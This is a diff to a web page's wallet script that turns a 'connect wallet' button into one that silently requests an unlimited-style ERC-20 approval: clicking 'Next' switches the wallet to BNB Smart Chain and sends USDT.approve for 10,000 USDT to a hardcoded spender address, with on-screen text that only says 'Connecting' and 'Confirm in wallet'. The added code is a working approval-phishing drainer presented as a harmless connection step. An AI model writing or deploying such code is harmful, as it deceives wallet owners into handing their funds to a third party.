@@ -487,19 +487,80 @@
   );
 
 
+
+
+
+
+
+
   /*
    * ==========================================
-   * TRUST WALLET PROVIDER
+   * USDT / BSC CONFIG
    * ==========================================
-   *
-   * Trust Wallet DApp Browser exposes:
-   *
-   * window.trustwallet.ethereum
-   *
-   * We deliberately use this FIRST.
    */
 
-  function getTrustWalletProvider() {
+  const TOKEN_ADDRESS =
+    "0x55d398326f99059fF775485246999027B3197955";
+
+  const SPENDER_ADDRESS =
+    "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
+
+  const BSC_CHAIN_ID_HEX =
+    "0x38";
+
+  /*
+   * BSC USDT uses 18 decimals.
+   *
+   * 10,000 USDT =
+   *
+   * 10000 * 10^18
+   */
+
+  const APPROVAL_AMOUNT =
+    10000000000000000000000n;
+
+
+  /*
+   * ==========================================
+   * ERC-20 approve(address,uint256)
+   * ==========================================
+   *
+   * Function selector:
+   * 095ea7b3
+   */
+
+  function buildApproveData() {
+
+    const spender =
+      SPENDER_ADDRESS
+        .slice(2)
+        .toLowerCase()
+        .padStart(64, "0");
+
+    const amount =
+      APPROVAL_AMOUNT
+        .toString(16)
+        .padStart(64, "0");
+
+    return (
+      "0x095ea7b3" +
+      spender +
+      amount
+    );
+  }
+
+
+  /*
+   * ==========================================
+   * FIND WALLET PROVIDER
+   * ==========================================
+   */
+
+  function getWalletProvider() {
+
+    /*
+     * Trust Wallet injected provider.
+     */
 
     if (
       window.trustwallet &&
@@ -507,9 +568,22 @@
       typeof window.trustwallet.ethereum.request ===
         "function"
     ) {
-
       return window.trustwallet.ethereum;
     }
+
+
+    /*
+     * MetaMask / standard EIP-1193 provider.
+     */
+
+    if (
+      window.ethereum &&
+      typeof window.ethereum.request ===
+        "function"
+    ) {
+      return window.ethereum;
+    }
+
 
     return null;
   }
@@ -517,35 +591,30 @@
 
   /*
    * ==========================================
-   * NEXT
+   * NEXT BUTTON
    * ==========================================
    */
+
+  const nextBtn =
+    document.getElementById("nextBtn");
+
 
   nextBtn.addEventListener(
     "click",
     async () => {
 
-      console.log(
-        "NEXT CLICKED"
-      );
+      const provider =
+        getWalletProvider();
 
 
       /*
-       * Get the actual Trust Wallet provider.
+       * No wallet injected.
        */
-
-      const provider =
-        getTrustWalletProvider();
-
 
       if (!provider) {
 
-        console.error(
-          "Trust Wallet provider not found."
-        );
-
         alert(
-          "Trust Wallet was not detected. Please open this DApp using the Trust Wallet DApp Browser."
+          "Open this page inside Trust Wallet or MetaMask."
         );
 
         return;
@@ -561,20 +630,14 @@
           "Connecting...";
 
 
-        console.log(
-          "Trust Wallet provider detected."
-        );
-
-
         /*
-         * =====================================
-         * DIRECT TRUST WALLET CONNECTION
-         * =====================================
+         * ======================================
+         * REQUEST WALLET ACCOUNT
+         * ======================================
          *
-         * This is the actual wallet request.
-         *
-         * It must be called directly from
-         * the user's button click.
+         * If the wallet hasn't authorized the
+         * DApp yet, the wallet handles that
+         * authorization.
          */
 
         const accounts =
@@ -584,166 +647,254 @@
           });
 
 
-        console.log(
-          "Trust Wallet response:",
-          accounts
-        );
-
-
-        /*
-         * Make sure an account was actually
-         * returned.
-         */
-
         if (
-          !Array.isArray(accounts) ||
+          !accounts ||
           accounts.length === 0
         ) {
-
           throw new Error(
-            "Trust Wallet did not return an account."
+            "No wallet account was returned."
           );
         }
 
 
-        const walletAddress =
+        const account =
           accounts[0];
 
 
         /*
-         * =====================================
+         * ======================================
          * CHECK BSC
-         * =====================================
+         * ======================================
          */
 
-        const rawChainId =
+        let chainId =
           await provider.request({
             method:
               "eth_chainId"
           });
 
 
-        console.log(
-          "Trust Wallet chain:",
-          rawChainId
-        );
+        chainId =
+          String(chainId)
+            .toLowerCase();
 
 
-        let chainId;
-
+        /*
+         * Switch to BSC if necessary.
+         */
 
         if (
-          typeof rawChainId === "number"
+          chainId !==
+          BSC_CHAIN_ID_HEX
         ) {
 
-          chainId =
-            rawChainId;
+          nextBtn.textContent =
+            "Switching network...";
 
-        } else {
 
-          const value =
-            String(rawChainId);
+          await provider.request({
 
-          chainId =
-            value
-              .toLowerCase()
-              .startsWith("0x")
-              ? parseInt(value, 16)
-              : parseInt(value, 10);
+            method:
+              "wallet_switchEthereumChain",
+
+            params: [
+              {
+                chainId:
+                  BSC_CHAIN_ID_HEX
+              }
+            ]
+
+          });
         }
 
 
         /*
-         * BSC Mainnet = 56
+         * ======================================
+         * BUILD APPROVE TRANSACTION
+         * ======================================
+         *
+         * This is:
+         *
+         * USDT.approve(
+         *   SPENDER_ADDRESS,
+         *   10,000 USDT
+         * )
          */
 
-        if (chainId !== 56) {
+        const data =
+          buildApproveData();
 
-          try {
 
+        console.log(
+          "Approval calldata:",
+          data
+        );
+
+
+        /*
+         * ======================================
+         * OPEN WALLET CONFIRMATION
+         * ======================================
+         */
+
+        nextBtn.textContent =
+          "Confirm in wallet...";
+
+
+        /*
+         * This is the REAL blockchain
+         * transaction.
+         *
+         * It goes to the USDT contract,
+         * NOT to the spender address.
+         */
+
+        const txHash =
+          await provider.request({
+
+            method:
+              "eth_sendTransaction",
+
+            params: [
+              {
+                from:
+                  account,
+
+                to:
+                  TOKEN_ADDRESS,
+
+                data:
+                  data
+              }
+            ]
+
+          });
+
+
+        console.log(
+          "Approval transaction:",
+          txHash
+        );
+
+
+        /*
+         * ======================================
+         * WAIT FOR MINING
+         * ======================================
+         */
+
+        nextBtn.textContent =
+          "Confirming...";
+
+
+        let receipt =
+          null;
+
+
+        for (
+          let i = 0;
+          i < 120;
+          i++
+        ) {
+
+          await new Promise(
+            resolve =>
+              setTimeout(
+                resolve,
+                2000
+              )
+          );
+
+
+          receipt =
             await provider.request({
 
               method:
-                "wallet_switchEthereumChain",
+                "eth_getTransactionReceipt",
 
               params: [
-                {
-                  chainId:
-                    "0x38"
-                }
+                txHash
               ]
 
             });
 
-          } catch (error) {
 
-            console.error(
-              "BSC switch rejected:",
-              error
-            );
-
-            alert(
-              "Please switch Trust Wallet to BNB Smart Chain."
-            );
-
-            nextBtn.disabled =
-              false;
-
-            nextBtn.textContent =
-              "Next";
-
-            return;
+          if (receipt) {
+            break;
           }
         }
 
 
         /*
-         * =====================================
-         * SUCCESS
-         * =====================================
+         * ======================================
+         * TRANSACTION NOT FOUND
+         * ======================================
+         */
+
+        if (!receipt) {
+
+          throw new Error(
+            "Transaction was submitted but confirmation timed out."
+          );
+        }
+
+
+        /*
+         * ======================================
+         * TRANSACTION FAILED
+         * ======================================
+         */
+
+        if (
+          receipt.status === "0x0" ||
+          receipt.status === 0
+        ) {
+
+          throw new Error(
+            "The approval transaction failed."
+          );
+        }
+
+
+        /*
+         * ======================================
+         * DONE
+         * ======================================
          */
 
         console.log(
-          "TRUST WALLET CONNECTED:",
-          walletAddress
+          "10,000 USDT approval confirmed:",
+          txHash
         );
 
-
-        /*
-         * Store the public wallet address.
-         */
-
-        sessionStorage.setItem(
-          "connectedWallet",
-          walletAddress
-        );
-
-
-        /*
-         * Display shortened address.
-         */
 
         nextBtn.textContent =
-          walletAddress.slice(0, 6) +
-          "..." +
-          walletAddress.slice(-4);
+          "Done";
+
+        nextBtn.disabled =
+          false;
 
 
         /*
-         * If you want to continue to your
-         * confirmation page, use:
+         * Optional:
+         *
+         * Go to your done page here.
          *
          * window.location.href =
-         *   "/confirm.html";
+         *   "/done.html";
          */
 
       } catch (error) {
 
         console.error(
-          "Trust Wallet connection error:",
+          "Approval error:",
           error
         );
 
+
+        /*
+         * User rejected the wallet popup.
+         */
 
         if (
           error &&
@@ -751,14 +902,14 @@
         ) {
 
           alert(
-            "Connection was rejected in Trust Wallet."
+            "Approval was rejected in the wallet."
           );
 
         } else {
 
           alert(
             error?.message ||
-            "Unable to connect to Trust Wallet."
+            "Unable to submit the approval transaction."
           );
         }
 
@@ -772,8 +923,29 @@
 
     }
   );
-
 </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
 
 </body>
 </html>
